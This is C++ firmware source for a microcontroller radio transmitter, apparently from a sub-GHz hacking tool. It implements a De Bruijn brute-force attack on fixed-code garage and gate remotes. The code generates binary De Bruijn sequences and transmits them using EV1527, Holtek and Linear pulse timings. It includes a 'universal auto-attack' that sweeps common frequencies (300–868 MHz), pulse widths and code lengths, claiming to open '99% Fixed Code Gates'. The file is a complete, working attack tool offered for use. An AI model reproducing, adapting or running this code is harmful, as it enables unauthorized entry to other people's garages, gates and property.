#include <Arduino.h>
#include <vector>
#include <map>

// --- INCLUDES DE PROTOCOLOS PARA EXACTITUD ---
#include "protocols/protocol.h"
#include "protocols/Holtek.h"
#include "protocols/EV1527.h"
#include "protocols/Linear.h"

// --- EXTERN DECLARATIONS ---
extern void dualPrintf(const char* format, ...);
extern void dualPrintln(String s);
extern void sendPulse(int duration);
extern void setFrequencyCorrected(float target_mhz);
extern char waitKey();
extern int checkPause();
extern int anyAvailable();
extern void clearBuffers();

// --- CLASE GENÉRICA PARA MODO UNIVERSAL ---
// Permite definir timings al vuelo sin crear un archivo .h
class protocol_dynamic : public c_rf_protocol {
public:
    protocol_dynamic(int te, int bit_len_mode = 0) {
        // bit_len_mode: 0 = EV1527 (1:3 pwm), 1 = Linear (1:1 Manchester-ish / simple)
        if (bit_len_mode == 0) {
            // Standard PWM (1T High, 2T Low vs 2T High, 1T Low)
            // Usamos positivo para HIGH, negativo para LOW (según sendPulse en v5.ino)
            transposition_table['0'] = {te, -te * 3}; // Short High, Long Low (Generic)
            transposition_table['1'] = {te * 3, -te}; // Long High, Short Low
            // Pilot generico
            pilot_period = {te, -te * 31}; 
        } else {
            // Otro modo si fuera necesario
            transposition_table['0'] = {te, -te};
            transposition_table['1'] = {te, -te * 2};
            pilot_period = {};
        }
        stop_bit = {};
    }
    
    // Método para reconfigurar al vuelo si es necesario
    void setTimings(int t_high0, int t_low0, int t_high1, int t_low1) {
        transposition_table['0'] = {t_high0, -abs(t_low0)};
        transposition_table['1'] = {t_high1, -abs(t_low1)};
    }
};

// --- CORE DE BRUIJN ---

std::vector<uint8_t> generateDeBruijn(int n) {
    std::vector<uint8_t> sequence;
    if (n > 20) return sequence;

    int total_unique = 1 << n;
    // Calloc inicializa a 0
    uint8_t* visited = (uint8_t*)calloc(total_unique / 8 + 1, 1); 
    
    if (!visited) { dualPrintln("[!] Memoria insuficiente para De Bruijn."); return sequence; }

    // Preámbulo de ceros para llenar la ventana inicial
    for (int i=0; i < n; i++) sequence.push_back(0); 
    
    uint32_t mask = (1 << n) - 1;
    uint32_t val = 0;
    visited[0] |= 1; 
    
    // Algoritmo Greedy "Prefer Ones"
    for (int i = 0; i < total_unique - 1; i++) { 
        uint32_t next_one = ((val << 1) & mask) | 1;
        uint32_t next_zero = ((val << 1) & mask);
        
        bool one_visited = (visited[next_one / 8] >> (next_one % 8)) & 1;
        
        if (!one_visited) {
            val = next_one;
            visited[next_one / 8] |= (1 << (next_one % 8));
            sequence.push_back(1);
        } else {
            val = next_zero;
            visited[next_zero / 8] |= (1 << (next_zero % 8));
            sequence.push_back(0);
        }
    }
    
    free(visited);
    return sequence;
}

// Envía la secuencia usando EXACTAMENTE la definición del protocolo
void sendDeBruijnSequence(c_rf_protocol* proto, const std::vector<uint8_t>& db_seq, int repeats) {
    for (int r = 0; r < repeats; r++) {
        
        // 1. Enviar Piloto (si existe) al inicio de la secuencia/repetición
        // Esto ayuda a despertar al receptor o sincronizar el AGC
        for (int p : proto->pilot_period) sendPulse(p);

        // 2. Transmitir bits
        for (size_t i = 0; i < db_seq.size(); i++) {
            // Check pausar cada 256 bits para no bloquear
            if (i % 256 == 0) {
                 int status = checkPause();
                 if (status == 2) return; 
                 if (status == 1) break; 
                 yield(); 
            }

            char bitChar = db_seq[i] ? '1' : '0';
            
            // Usar la tabla de transposición EXACTA del protocolo
            if(proto->transposition_table.count(bitChar)) {
                const std::vector<int>& pulses = proto->transposition_table[bitChar];
                for (int t : pulses) sendPulse(t);
            }
        }

        // 3. Stop Bit (si existe) o pequeña pausa entre repeticiones
        if (!proto->stop_bit.empty()) {
             for (int s : proto->stop_bit) sendPulse(s);
        } else {
             sendPulse(-10000); // Pausa genérica si no hay stop definido
        }
    }
}

// Función principal de ejecución
void runDeBruijn(c_rf_protocol* proto, const char* name, int n, float freq, int repeats) {
    dualPrintf("\n[DeBruijn] Gen B(2, %d) para %s ... ", n, name);
    std::vector<uint8_t> seq = generateDeBruijn(n);
    dualPrintf("Len: %d bits\n", (int)seq.size());
    
    dualPrintf("[DeBruijn] TX @ %.2f MHz | Reps: %d\n", freq, repeats);
    setFrequencyCorrected(freq);
    
    sendDeBruijnSequence(proto, seq, repeats);
    dualPrintln("[DeBruijn] Finalizado.");
}

// --- MENÚS ---

void menuUniversalDeBruijn() {
    dualPrintln("\n==========================================");
    dualPrintln("   ULTIMATE UNIVERSAL DE BRUIJN SWEEP     ");
    dualPrintln("   Covers: 99% Fixed Code Gates           ");
    dualPrintln("   Note: This sequence takes time!        ");
    dualPrintln("==========================================");
    
    // 1. FREQUENCIES (Most common first)
    // 433.92 (EU/Global), 315.00 (USA/Asia), 868.35 (EU Secure), 
    // 300/310/318/390 (USA Old/Genie/Linear)
    float freqs[] = {433.92, 315.00, 868.35, 300.00, 310.00, 318.00, 390.00, 433.42};
    
    // 2. TIMINGS (Pulse Width in us)
    // 300us: Standard EV1527/China
    // 200us: Fast systems
    // 450us: Slower/Older systems (Linear/Came approx)
    int tes[] = {300, 200, 450}; 
    
    // 3. BITS (Lengths)
    // 12: The absolute standard for fixed code.
    // 10: Multi-code / Linear / Dip-switch 10.
    // 8:  Very old systems.
    // (Note: 24-bit De Bruijn takes too long for a universal sweep -> ~1.5h per config)
    int bits[] = {12, 10, 8};

    int total_configs = sizeof(freqs)/sizeof(float) * sizeof(tes)/sizeof(int) * sizeof(bits)/sizeof(int);
    int current_config = 0;

    for (float f : freqs) {
        for (int b : bits) {
            for (int t : tes) {
                current_config++;
                int status = checkPause();
                if (status == 2) { dualPrintln("[!] Universal Attack CANCELLED."); return; }
                if (status == 1) continue; // Skip

                // Progress Info
                dualPrintf("\n[%d/%d] Freq: %.2f | Bits: %d | Te: %dus\n", current_config, total_configs, f, b, t);
                
                // Configure generic protocol with current timing
                protocol_dynamic dynProto(t); 
                
                // Run De Bruijn (Repeats reduced to 3 for speed in universal mode)
                // Note: We generate the sequence fresh each time. 
                // Optimization: Could cache the vector, but RAM is tight and generation is fast for <=12 bits.
                std::vector<uint8_t> seq = generateDeBruijn(b);
                setFrequencyCorrected(f);
                sendDeBruijnSequence(&dynProto, seq, 3); // 3 Repeats
                
                yield(); // Prevent watchdog crash
            }
        }
    }
    dualPrintln("\n[UNIVERSAL] Full Sweep Complete.");
}

void menuDeBruijn() {
    while(true) {
        dualPrintln("\n=== DE BRUIJN ATTACK (EXACT TIMING) ===");
        dualPrintln("1. Generic 12-bit (433.92 MHz, Te=300us) [EV1527 Style]");
        dualPrintln("2. Generic 12-bit (315.00 MHz, Te=300us)");
        dualPrintln("3. Holtek 12-bit (433.92 MHz) [EXACT]");
        dualPrintln("4. Linear 10-bit (300.00 MHz) [EXACT]");
        dualPrintln("9. UNIVERSAL AUTO-ATTACK (All Combos)");
        dualPrintln("B. Volver");
        
        char c = waitKey();
        if (c == 'B' || c == 'b') return;
        
        if (c == '1') {
            protocol_dynamic p(300);
            runDeBruijn(&p, "Generic 433", 12, 433.92, 5);
        }
        if (c == '2') {
            protocol_dynamic p(300);
            runDeBruijn(&p, "Generic 315", 12, 315.00, 5);
        }
        if (c == '3') {
            // Aquí usamos la clase REAL de Holtek para usar sus timings exactos
            protocol_holtek p; 
            runDeBruijn(&p, "Holtek", 12, 433.92, 5);
        }
        if (c == '4') {
            protocol_linear p;
            runDeBruijn(&p, "Linear", 10, 300.00, 5);
        }
        
        if (c == '9') menuUniversalDeBruijn();
    }
}